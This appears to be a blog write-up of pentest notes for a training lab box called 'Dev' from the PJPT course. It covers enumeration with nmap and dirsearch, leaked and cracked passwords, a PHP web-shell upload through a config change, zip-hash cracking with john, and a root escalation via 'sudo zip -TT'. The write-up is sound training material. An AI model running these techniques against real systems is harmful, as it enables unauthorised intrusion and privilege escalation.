---
layout: post
title: "PJPT Capstone: Dev"
author: Andrew Cherney
date: 2024-01-31 04:59:54
tags: pjpt linux webapp 
icon: "assets/icons/pjpt.png"
post_description: "This is a part of the mid-course capstone of the PJPT. Structured more as pentest notes than an actual writeup. It is notable there seem to be two or more options for an initial foothold. The other includes downloading the zip earlier and enumerating the user. A simple and quick webapp box."
---

# Summary

{{ page.post_description }}

10.0.69.8
### Findings

22 10.0.69.8 - OpenSSH 7.9p1

<br>
80 10.0.69.8 - Apache httpd 2.4.38 ((Debian))

- Misconfigured Site? - Bolt
- Leaked Database Credentials - /app/config/config.yml

<br>
111 10.0.69.8 - portmapper


8080 10.0.69.8 - Apache httpd 2.4.38 ((Debian))

- Apache PHP Version Page - /
- Leaked Site Admin Credentials - /dev/pages/member.admin
- Arbitrary File Upload - /dev/index.php?p=action.upload

<br>
localhost 10.0.69.8

- Reused Password - bolt DB and jeanpaul id_rsa
- Weak password - save.zip
- Weak password - MariaDB bolt user
- Weak password - jeanpaul id_rsa
- Sudo Permissions Privilege Escalation - jeanpaul /usr/bin/zip

<br>

# Enum

### Network Scan

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $nmap -T4 -p- -A 10.0.69.8
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-25 20:22 CST
Nmap scan report for 10.0.69.8
Host is up (0.0038s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39039/udp6  mountd
|   100005  1,2,3      42598/udp   mountd
|   100005  1,2,3      49673/tcp6  mountd
|   100005  1,2,3      58555/tcp   mountd
|   100021  1,3,4      33846/udp6  nlockmgr
|   100021  1,3,4      37317/tcp   nlockmgr
|   100021  1,3,4      41027/tcp6  nlockmgr
|   100021  1,3,4      57375/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
36191/tcp open  mountd   1-3 (RPC #100005)
37317/tcp open  nlockmgr 1-4 (RPC #100021)
48451/tcp open  mountd   1-3 (RPC #100005)
58555/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.08 seconds
```


### NFS

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $showmount -e 10.0.69.8
Export list for 10.0.69.8:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $nmap --script=nfs-ls,nfs-showmount,nfs-statfs 10.0.69.8
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-25 21:21 CST
Nmap scan report for 10.0.69.8
Host is up (0.0032s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
| nfs-showmount: 
|_  /srv/nfs 172.16.0.0/12 10.0.0.0/8 192.168.0.0/16
2049/tcp open  nfs
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```
### Webapp - 80

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $dirsearch -u 10.0.69.8:80

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/PJPT/Dev/reports/_10.0.69.8_80/_24-01-25_20-38-54.txt

Target: http://10.0.69.8/

[20:38:54] Starting: 
[20:38:57] 200 -  931B  - /.gitignore
[20:38:57] 403 -  274B  - /.ht_wsr.txt
[20:38:57] 403 -  274B  - /.htaccess.bak1
[20:38:57] 403 -  274B  - /.htaccess.sample
[20:38:57] 403 -  274B  - /.htaccess.save
[20:38:57] 403 -  274B  - /.htaccess_sc
[20:38:57] 403 -  274B  - /.htaccessOLD
[20:38:57] 403 -  274B  - /.htaccessOLD2
[20:38:57] 403 -  274B  - /.htm
[20:38:57] 403 -  274B  - /.html
[20:38:57] 403 -  274B  - /.htaccess_extra
[20:38:57] 403 -  274B  - /.htaccess_orig
[20:38:57] 403 -  274B  - /.htpasswd_test
[20:38:57] 403 -  274B  - /.htaccessBAK
[20:38:57] 403 -  274B  - /.htpasswds
[20:38:57] 403 -  274B  - /.htaccess.orig
[20:38:57] 403 -  274B  - /.httr-oauth
[20:38:59] 403 -  274B  - /.php
[20:39:20] 301 -  304B  - /app  ->  http://10.0.69.8/app/
[20:39:20] 200 -  514B  - /app/
[20:39:20] 200 -  483B  - /app/cache/
[20:39:28] 200 -  971B  - /composer.json
[20:39:28] 200 -  206KB - /composer.lock
[20:40:04] 301 -  307B  - /public  ->  http://10.0.69.8/public/
[20:40:05] 200 -  345B  - /README.md
[20:40:06] 302 -  332B  - /public/  ->  /public/bolt/userfirst
[20:40:08] 403 -  274B  - /server-status/
[20:40:08] 403 -  274B  - /server-status
[20:40:12] 301 -  304B  - /src  ->  http://10.0.69.8/src/
[20:40:12] 200 -  440B  - /src/
[20:40:21] 200 -    0B  - /vendor/composer/autoload_classmap.php
[20:40:21] 200 -    0B  - /vendor/composer/autoload_files.php
[20:40:21] 200 -    0B  - /vendor/autoload.php
[20:40:21] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[20:40:21] 200 -  827B  - /vendor/
[20:40:21] 200 -    0B  - /vendor/composer/autoload_static.php
[20:40:21] 200 -  191KB - /vendor/composer/installed.json
[20:40:21] 200 -    1KB - /vendor/composer/LICENSE
[20:40:21] 200 -    0B  - /vendor/composer/ClassLoader.php
[20:40:21] 200 -    0B  - /vendor/composer/autoload_psr4.php
[20:40:21] 200 -    0B  - /vendor/composer/autoload_real.php

Task Completed
```

![](/img/dev/dev_80_bolt_appconfig.png)

```bash
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
```

### Webapp - 8080

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $dirsearch -u 10.0.69.8:8080

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/PJPT/Dev/reports/_10.0.69.8_8080/_24-01-25_20-39-05.txt

Target: http://10.0.69.8:8080/

[20:39:05] Starting: 
[20:39:10] 403 -  276B  - /.ht_wsr.txt
[20:39:10] 403 -  276B  - /.htaccess.bak1
[20:39:10] 403 -  276B  - /.htaccess.sample
[20:39:10] 403 -  276B  - /.htaccess_sc
[20:39:10] 403 -  276B  - /.htaccessOLD
[20:39:10] 403 -  276B  - /.html
[20:39:10] 403 -  276B  - /.htm
[20:39:10] 403 -  276B  - /.htpasswd_test
[20:39:10] 403 -  276B  - /.htaccess_extra
[20:39:10] 403 -  276B  - /.httr-oauth
[20:39:10] 403 -  276B  - /.htaccessOLD2
[20:39:10] 403 -  276B  - /.htaccess.orig
[20:39:10] 403 -  276B  - /.htaccessBAK
[20:39:10] 403 -  276B  - /.htaccess_orig
[20:39:10] 403 -  276B  - /.htaccess.save
[20:39:10] 403 -  276B  - /.htpasswds
[20:39:12] 403 -  276B  - /.php
[20:39:45] 301 -  311B  - /dev  ->  http://10.0.69.8:8080/dev/
[20:39:45] 200 -    2KB - /dev/
[20:40:23] 403 -  276B  - /server-status
[20:40:23] 403 -  276B  - /server-status/

Task Completed
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $gobuster dir -u http://10.0.69.8:8080/dev/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.69.8:8080/dev/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2024/01/25 20:41:49 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 7597]
/files                (Status: 301) [Size: 317] [--> http://10.0.69.8:8080/dev/files/]
/pages                (Status: 301) [Size: 317] [--> http://10.0.69.8:8080/dev/pages/]
/forms                (Status: 301) [Size: 317] [--> http://10.0.69.8:8080/dev/forms/]
/config               (Status: 301) [Size: 318] [--> http://10.0.69.8:8080/dev/config/]
/stamps               (Status: 301) [Size: 318] [--> http://10.0.69.8:8080/dev/stamps/]
```

![](/img/dev/dev_8080_pages_admin_pass_leak.png)

try to login as admin

![](/img/dev/dev_8080_admin_login.png)

![](/img/dev/dev_8080_admin.png)

add php to upload file types

```
indexing: true  
indexbatch: 25  
language:  
linkrot: true  
missingMark: true  
robotBlock: index*,info*,log*,action*,code*,group*,template*  
safeData: title  
searchLimit: 50  
stampsExpire: 90  
stampsMax: 7  
stampsMin: 1  
sitemail:  
skin:  
uploadSize: 100000  
uploadImgTypes: gif,jpg,jpeg,png,svg  
uploadFileTypes: pdf,txt,php
```

head to upload under actions

![](/img/dev/dev_8080_admin_actions.png)

![](/img/dev/dev_8080_admin_image_upload.png)

![](/img/dev/dev_8080_files_boltshell.png)



### mysql

```bash
www-data@dev:/var/www/htdev/dev$ mysql -u bolt -p bolt
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 46
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [bolt]> show tables;
Empty set (0.000 sec)

MariaDB [bolt]> show databases;
+--------------------+
| Database           |
+--------------------+
| bolt               |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [bolt]> Ctrl-C -- exit!
Aborted
```

## www-data

```bash
www-data@dev:/var/www/htdev$ ls /srv/nfs/
save.zip
www-data@dev:/srv/nfs$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.0.69.5 - - [26/Jan/2024 07:16:56] "GET /save.zip HTTP/1.1" 200 -
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $wget http://10.0.69.8:8081/save.zip
--2024-01-25 22:06:53--  http://10.0.69.8:8081/save.zip
Connecting to 10.0.69.8:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1911 (1.9K) [application/zip]
Saving to: ‘save.zip’

save.zip                        100%[=====================================================>]   1.87K  --.-KB/s    in 0s      

2024-01-25 22:06:53 (204 MB/s) - ‘save.zip’ saved [1911/1911]

┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $unzip save.zip 
Archive:  save.zip
[save.zip] id_rsa password:
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $zip2john save.zip > save.john
ver 2.0 efh 5455 efh 7875 save.zip/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=1435, decmplen=1876, crc=15E468E2
ver 2.0 efh 5455 efh 7875 save.zip/todo.txt PKZIP Encr: 2b chk, TS_chk, cmplen=138, decmplen=164, crc=837FAA9E
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $cat save.john 
save.zip:$pkzip2$2*2*1*0*8*24*15e4*2a0d*fa2fd40a19c9abbcb3b68f36c7408290b667892909fe2a69a375691c081567b216099286*2*0*8a*a4*837faa9e*5eb*42*8*8a*837f*2aa1*b677b6989f72ee6f3e50d638fcedfc42508d4f87903a6edc960ab38f2c8795ce11b818da9f5723ca1ac08e5c4ff76699bbd1a3c4307a1c97971cce7bb8a5be88359a6a20b4e5a7417558ac38cd45bc32b97ff8d3fc671c4b97fb17011bdcfa702d5b0d7d88b63a6ea62e5e7fd06ca4f8309e9cbd637aff0de5d564e81ec472e9b457baf2c71d5c6d7ae9*$/pkzip2$::save.zip:todo.txt, id_rsa:save.zip
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $john save.john --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
java101          (save.zip)
1g 0:00:00:00 DONE (2024-01-25 22:10) 5.882g/s 5397Kp/s 5397Kc/s 5397KC/s jm9863..jalovev
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $unzip save.zip
Archive:  save.zip
[save.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: todo.txt                
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $cat todo.txt 
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Dev]
└──╼ $ssh jeanpaul@10.0.69.8 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$ 
```
# jeanpaul

```bash
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# ls /root 		
flag.txt
# cat /root/flag.txt
Congratz on rooting this box !
```

